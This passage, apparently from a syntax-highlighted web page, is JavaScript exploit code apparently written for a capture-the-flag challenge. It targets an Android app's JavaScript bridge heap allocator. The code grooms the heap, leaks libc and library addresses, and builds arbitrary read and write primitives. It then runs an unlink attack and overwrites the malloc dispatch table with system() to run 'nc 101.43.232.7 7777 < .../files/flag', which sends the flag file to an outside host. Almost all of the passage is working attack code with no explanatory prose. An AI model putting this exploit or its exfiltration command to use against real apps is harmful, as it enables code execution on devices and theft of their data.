</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">found_idx</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">get_libc_addr</span><span style="color:#c0c5ce;">() {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">found_idx </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">chunk_fengshui</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">// for debug
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">debug1_idx </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">35</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#96b5b4;">add</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">debug1_idx</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">found_idx</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">toString</span><span style="color:#c0c5ce;">(), </span><span style="color:#d08770;">0x6c</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">data </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">genNStr</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">41</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#d08770;">0x58</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">data</span><span style="color:#c0c5ce;">+= </span><span style="color:#8fa1b3;">genNStr</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">00</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#d08770;">0x4</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">data</span><span style="color:#c0c5ce;">+= </span><span style="color:#8fa1b3;">LEToHex</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0xd3</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">edit</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">found_idx</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">data</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">overlap_idx </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">32</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">// spray
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">index </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">index </span><span style="color:#c0c5ce;">&lt; </span><span style="color:#d08770;">50</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">++) {
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#96b5b4;">add</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">49</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">A</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">0xc4</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">cmd </span><span style="color:#c0c5ce;">= &quot;</span><span style="color:#a3be8c;">nc 101.43.232.7 7777 &lt; /data/data/com.avss.testallocator/files/flag</span><span style="color:#c0c5ce;">&quot;;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">cmd_1 </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">cmd</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">slice</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">cmd_2 </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">cmd</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">slice</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">cmd</span><span style="color:#c0c5ce;">.length);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#96b5b4;">add</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">49</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">cmd_1</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xc4</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">edit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">49</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">convertToASCII</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">cmd_2</span><span style="color:#c0c5ce;">)+&quot;</span><span style="color:#a3be8c;">0000</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">&lt; </span><span style="color:#d08770;">0x100000</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">++) {}
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">delete</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">found_idx</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">check_content </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">show</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">found_idx</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x5c</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">libc_addr </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">hexToLE</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">check_content</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">slice</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x60</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x60</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">));
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">// debug
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">edit</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">debug1_idx</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">LEToHex</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">libc_addr</span><span style="color:#c0c5ce;">)+</span><span style="color:#8fa1b3;">LEToHex</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x41424344</span><span style="color:#c0c5ce;">));
</span><span style="color:#c0c5ce;">        
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">libc_addr</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">get_libhello_addr</span><span style="color:#c0c5ce;">(){
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">// for debug
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">debug2_idx </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">34</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#96b5b4;">add</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">debug2_idx</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">A</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">0x6c</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">libhello_addr </span><span style="color:#c0c5ce;">= -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">cnt </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">while</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">libhello_addr </span><span style="color:#c0c5ce;">== -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">){
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#96b5b4;">add</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">cnt</span><span style="color:#c0c5ce;">%</span><span style="color:#d08770;">30</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">A</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">0x4</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">openfile</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">a</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">possible_addr </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">hexToLE</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">show</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">cnt</span><span style="color:#c0c5ce;">%</span><span style="color:#d08770;">30</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x4</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">).</span><span style="color:#8fa1b3;">slice</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">));
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((</span><span style="color:#bf616a;">possible_addr</span><span style="color:#c0c5ce;">&gt;&gt;&gt;</span><span style="color:#d08770;">24 </span><span style="color:#c0c5ce;">== </span><span style="color:#d08770;">0xa5</span><span style="color:#c0c5ce;">) &amp;&amp; ((</span><span style="color:#bf616a;">possible_addr</span><span style="color:#c0c5ce;">&amp;</span><span style="color:#d08770;">0xff</span><span style="color:#c0c5ce;">)&gt;&gt;&gt;</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)==</span><span style="color:#d08770;">0xdc</span><span style="color:#c0c5ce;">){
</span><span style="color:#c0c5ce;">                </span><span style="color:#bf616a;">libhello_addr </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">possible_addr</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">            }
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">cnt</span><span style="color:#c0c5ce;">+=</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">// debug
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">edit</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">debug2_idx</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">LEToHex</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">libhello_addr</span><span style="color:#c0c5ce;">)+</span><span style="color:#8fa1b3;">LEToHex</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x45464748</span><span style="color:#c0c5ce;">));
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">libhello_addr</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">arb_write</span><span style="color:#c0c5ce;">(control_idx, victim_idx, addr, ct){
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">edit</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">control_idx</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">LEToHex</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">addr</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">0x8</span><span style="color:#c0c5ce;">));
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">edit</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">victim_idx</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">ct</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">arb_read</span><span style="color:#c0c5ce;">(control_idx, victim_idx, addr){
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">edit</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">control_idx</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">LEToHex</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">addr</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">0x8</span><span style="color:#c0c5ce;">));
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">show</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">victim_idx</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x5c</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">unlink_attack</span><span style="color:#c0c5ce;">(libc_addr, libhello_addr){
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">found_idx </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">chunk_fengshui</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">// for debug
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">debu3_idx </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">33</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#96b5b4;">add</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">debu3_idx</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">found_idx</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">toString</span><span style="color:#c0c5ce;">(), </span><span style="color:#d08770;">0x6c</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">libc_offset </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0x4d250</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">libhello_offset </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0x19bdc</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">libc_base </span><span style="color:#c0c5ce;">= ((</span><span style="color:#bf616a;">libc_addr</span><span style="color:#c0c5ce;">-</span><span style="color:#bf616a;">libc_offset</span><span style="color:#c0c5ce;">)&amp;</span><span style="color:#d08770;">0xfffff000</span><span style="color:#c0c5ce;">)&gt;&gt;&gt;</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">libhello_base </span><span style="color:#c0c5ce;">= ((</span><span style="color:#bf616a;">libhello_addr</span><span style="color:#c0c5ce;">-</span><span style="color:#bf616a;">libhello_offset</span><span style="color:#c0c5ce;">)&amp;</span><span style="color:#d08770;">0xfffff000</span><span style="color:#c0c5ce;">)&gt;&gt;&gt;</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">chunklist_addr </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">libhello_base</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">0x1c630</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">*(</span><span style="color:#bf616a;">found_idx</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">chunk_1 </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">genNStr</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">41</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">0x58</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">chunk_1</span><span style="color:#c0c5ce;">+= </span><span style="color:#8fa1b3;">genNStr</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">00</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">12</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">edit</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">found_idx</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">chunk_1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">chunk_2 </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">LEToHex</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">chunklist_addr</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">12</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">chunk_2</span><span style="color:#c0c5ce;">+= </span><span style="color:#8fa1b3;">LEToHex</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">chunklist_addr</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">chunk_2</span><span style="color:#c0c5ce;">+= </span><span style="color:#8fa1b3;">genNStr</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">41</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">0x50</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">chunk_2</span><span style="color:#c0c5ce;">+= </span><span style="color:#8fa1b3;">LEToHex</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x60</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">chunk_2</span><span style="color:#c0c5ce;">+= </span><span style="color:#8fa1b3;">LEToHex</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x6a</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">edit</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">found_idx</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">chunk_2</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">// unlink
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">delete</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">found_idx</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">control_idx </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">found_idx</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">victim_idx </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">found_idx</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">libc_malloc_dispatch </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0x49000</span><span style="color:#c0c5ce;">+</span><span style="color:#bf616a;">libc_base</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">fake_libc_malloc_dispatch </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0x49320</span><span style="color:#c0c5ce;">+</span><span style="color:#bf616a;">libc_base</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">system_addr </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">libc_base</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">0x246a0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">dlmalloc_addr </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">libc_base</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">0xfc94</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">dlcalloc </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">libc_base</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">0x1164c</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">dlrealloc </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">libc_base</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">0x11694</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">dlmemalign </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">libc_base</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">0x117cc</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">dlmalloc_usable_size </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">libc_base</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">0x11d98</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">hijack_dispatch_ct </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">LEToHex</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">dlmalloc_addr</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)+</span><span style="color:#8fa1b3;">LEToHex</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">system_addr</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)+</span><span style="color:#8fa1b3;">LEToHex</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">dlcalloc</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)+</span><span style="color:#8fa1b3;">LEToHex</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">dlrealloc</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)+</span><span style="color:#8fa1b3;">LEToHex</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">dlmemalign</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)+</span><span style="color:#8fa1b3;">LEToHex</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">dlmalloc_usable_size</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">arb_write</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">control_idx</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">victim_idx</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">fake_libc_malloc_dispatch</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">hijack_dispatch_ct</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">arb_write</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">control_idx</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">victim_idx</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">libc_malloc_dispatch</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">LEToHex</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">fake_libc_malloc_dispatch</span><span style="color:#c0c5ce;">));
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">delete</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">49</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">libhello_addr </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">get_libhello_addr</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">    
